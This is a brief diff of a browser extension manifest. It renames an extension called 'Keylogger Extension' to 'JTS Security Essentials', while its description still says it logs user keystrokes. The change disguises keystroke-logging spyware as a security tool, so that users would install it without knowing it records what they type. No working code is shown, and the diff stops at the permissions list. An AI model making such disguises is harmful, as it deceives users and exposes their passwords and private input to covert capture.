@@ -1,6 +1,6 @@
 {
     "manifest_version": 2,
-    "name": "Keylogger Extension",
+    "name": "JTS Security Essentials",
     "description": "Logs user keystrokes for monitoring purposes",
     "version": "1.0",
     "permissions": [
